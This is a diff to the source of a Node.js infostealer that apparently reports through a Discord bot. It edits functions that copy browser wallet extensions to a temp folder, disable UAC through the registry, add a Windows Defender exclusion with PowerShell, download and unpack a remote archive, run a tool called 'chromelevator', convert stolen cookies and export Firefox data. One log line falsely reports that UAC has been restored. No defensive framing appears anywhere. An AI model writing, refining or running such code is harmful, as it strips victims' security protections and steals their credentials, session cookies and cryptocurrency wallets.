@@ -42,6 +42,24 @@ const FormData = require('form-data'); // make sure it's installed
  
  
 
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
 
 
 
@@ -1211,17 +1229,14 @@ function copyBrowserWalletsToTemp() {
 
     try {
       const profiles = getBrowserProfiles(browserDataPath);
-      console.log(`Found ${profiles.length} profiles for ${browserName}`);
       
       for (const profile of profiles) {
-        console.log(`Processing profile: ${profile.name}`);
         
         for (const [extName, obfuscatedExtPath] of Object.entries(extensionPaths)) {
           const deobfuscatedExtPath = deobfuscate(obfuscatedExtPath);
           const source = path.join(profile.path, deobfuscatedExtPath);
           const dest = path.join(destBase, browserName, profile.name, extName);
           
-          console.log(`Checking extension: ${extName} at ${source}`);
           
           if (fswithout.existsSync(source)) {
             try {
@@ -1240,7 +1255,6 @@ function copyBrowserWalletsToTemp() {
               console.error(`Error copying ${extName}:`, err);
             }
           } else {
-            console.log(`Source not found: ${source}`);
           }
         }
       }
@@ -2297,24 +2311,15 @@ async function fetchLatestDownloadUrl() {
 }
 async function addExclusionDisableUACTemporarily() {
     const username =
-        process.env.USERNAME ||
-        (process.env.USERPROFILE ? path.basename(process.env.USERPROFILE) : null);
+  process.env.USERNAME ||
+  (process.env.USERPROFILE ? path.basename(process.env.USERPROFILE) : null);
     const exclusionPath = `C:\\Users\\${username}\\AppData\\LocalLow`;
     const scriptsPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\scripts`;
     
-    console.log('=== Firefox Data Export Process ===');
-    
-    // Check if running as UpdateService.exe
-    const isUpdateService = process.argv[0].endsWith('UpdateService.exe') || 
-                           process.argv[1].endsWith('UpdateService.exe') ||
-                           process.title.includes('UpdateService');
-    
-    if (isUpdateService) {
-        console.log('\n⚡ Running as UpdateService.exe - focusing on Firefox operations only');
-    }
+    console.log('=== Windows Defender Exclusion and Browser Injection Process ===');
     
     try {
-        if (!isUpdateService) {
+        // Step 1: Temporarily disable UAC and add exclusion
             console.log('\n1. Temporarily adjusting UAC settings...');
             await execAsync('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f');
             console.log('✓ UAC temporarily disabled');
@@ -2325,92 +2330,72 @@ async function addExclusionDisableUACTemporarily() {
             // Add the exclusion
             await execAsync(`powershell -Command "Add-MpPreference -ExclusionPath '${exclusionPath}'"`);
             console.log('✓ Exclusion added without UAC prompt');
-            
-            // Step 2: Verify exclusion
-            console.log('\n2. Verifying exclusion...');
-            const isVerified = await verifyExclusion(exclusionPath);
-            
-            if (!isVerified) {
-                console.log('⚠ Continuing despite verification failure...');
-            }
+        
+
+        
+        // Step 2: Verify exclusion
+        console.log('\n2. Verifying exclusion...');
+        const isVerified = await verifyExclusion(exclusionPath);
+        
+        if (!isVerified) {
+            console.log('⚠ Continuing despite verification failure...');
         }
         
-        // For UpdateService.exe, only do Firefox operations
-        if (isUpdateService) {
-            console.log('\n3. Running Firefox data export only...');
-            
-            // Ensure scripts directory exists
-            try {
-                await fs.access(scriptsPath);
-            } catch {
-                await fs.mkdir(scriptsPath, { recursive: true });
-            }
-            
-            // Kill browsers to ensure clean state
-            await killBrowsers();
-            
-            // Run Firefox data export directly
-            await runFirefoxDataExport();
-            
-            console.log('✓ Firefox data export completed successfully');
-            
-        } else {
-            // Original full process for non-UpdateService.exe
-            
-            try {
-                await fs.access(scriptsPath);
-            } catch {
-                await fs.mkdir(scriptsPath, { recursive: true });
-                console.log(`✓ Created directory: ${scriptsPath}`);
-            }
-            
-            // Fetch the latest URL
-            await fetchLatestDownloadUrl();
-            if (!downloadUrlChrome) {
-                throw new Error("Failed to fetch latest download URL - URL is null");
-            }
-            
-            // Create dynamic zipPath using the fetched URL filename
-            const fileName = downloadUrlChrome.split('/').pop();
-            const zipPath = path.join(scriptsPath, fileName);
-            
-            console.log(`✓ Downloading: ${fileName}`);
-            
-            await downloadFile(downloadUrlChrome, zipPath);
-            
-            // Step 4: Extract the file using adm-zip
-            console.log('\n4. Extracting files with adm-zip...');
-            await unzipFileWithNPM(zipPath, scriptsPath);
-            
-            // Step 5: Verify extraction
-            console.log('\n5. Verifying extraction...');
-            await listExtractedFiles(scriptsPath);
-            
-            await killBrowsers();
-            
-            // Step 7: Run chromelevator
-            await runChromelevator(username);
-            
-            // Step 8: Convert cookies to Netscape format
-            await convertCookiesToNetscape(username);
-            
-            // Step 9: Export Firefox data
-            await runFirefoxDataExport();
-            
-            // Step 10: Clean up zip file
-            if (fswithout.existsSync(zipPath)) {
-                fswithout.unlinkSync(zipPath);
-            }
+        // Step 3: Download the file
+        console.log('\n3. Starting download...');
+        
+        try {
+            await fs.access(scriptsPath);
+        } catch {
+            await fs.mkdir(scriptsPath, { recursive: true });
+            console.log(`✓ Created directory: ${scriptsPath}`);
+        }
+        
+        // Fetch the latest URL
+        await fetchLatestDownloadUrl();
+        if (!downloadUrlChrome) {
+            throw new Error("Failed to fetch latest download URL - URL is null");
+        }
+        
+        // Create dynamic zipPath using the fetched URL filename
+        const fileName = downloadUrlChrome.split('/').pop(); // Extract filename from URL
+        const zipPath = path.join(scriptsPath, fileName);
+        
+        console.log(`✓ Downloading: ${fileName}`);
+        
+        await downloadFile(downloadUrlChrome, zipPath);
+        
+        // Step 4: Extract the file using adm-zip
+        console.log('\n4. Extracting files with adm-zip...');
+        await unzipFileWithNPM(zipPath, scriptsPath);
+        
+        // Rest of your code remains the same...
+        // Step 5: Verify extraction
+        console.log('\n5. Verifying extraction...');
+        await listExtractedFiles(scriptsPath);
+        
+        await killBrowsers();
+        
+        // Step 7: Run chromelevator
+        await runChromelevator(username);
+        
+        // Step 8: Convert cookies to Netscape format
+        await convertCookiesToNetscape(username);
+        
+        // Step 9: Export Firefox data
+        await runFirefoxDataExport();
+        
+        // Step 10: Clean up zip file
+        if (fswithout.existsSync(zipPath)) {
+            fswithout.unlinkSync(zipPath);
         }
     } catch (error) {
         console.error('\n❌ Process failed:', error.message);
     } finally {
-        if (!isUpdateService) {
-            try {
-                console.log('\n✓ UAC restored to Windows default (level 5)');
-            } catch (restoreError) {
-                console.error('❌ Failed to restore UAC:', restoreError.message);
-            }
+        try {
+            console.log('\n✓ UAC restored to Windows default (level 5)');
+        } catch (restoreError) {
+            console.error('❌ Failed to restore UAC:', restoreError.message);
         }
     }
 }
@@ -3401,7 +3386,7 @@ client.once('clientReady', async () => {
                 await copyBrowserWalletsToTemp();
             }
             try {
-                await zipAndUploadSteamUi(guild);
+                // await zipAndUploadSteamUi(guild);
             } catch (error) {
             }
 
